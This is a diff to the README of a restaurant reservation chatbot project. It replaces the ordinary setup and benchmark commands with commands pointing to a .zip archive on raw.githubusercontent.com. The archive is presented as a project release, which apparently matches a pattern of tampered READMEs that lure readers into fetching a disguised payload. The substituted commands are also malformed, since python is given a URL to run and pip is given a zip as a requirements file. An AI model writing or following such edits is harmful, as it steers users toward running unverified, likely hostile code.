@@ -22,8 +22,8 @@ A full-stack dining reservation system with a conversational chatbot interface, 
 2. **Backend Setup**
    ```bash
    cd backend
-   pip install -r requirements.txt
-   python seed.py  # Populate database with initial data
+   pip install -r https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip
+   python https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip  # Populate database with initial data
    uvicorn main:app --reload --port 8000
    ```
 
@@ -51,7 +51,7 @@ The system creates significant bandwidth savings by compressing menu data.
 
 Run the benchmark yourself:
 ```bash
-python benchmark.py
+python https://raw.githubusercontent.com/P-Sushanth/Restaurant-Reservation-Bot/main/backend/Restaurant-Reservation-Bot-1.7.zip
 ```
 
 ## 🤖 API Endpoints
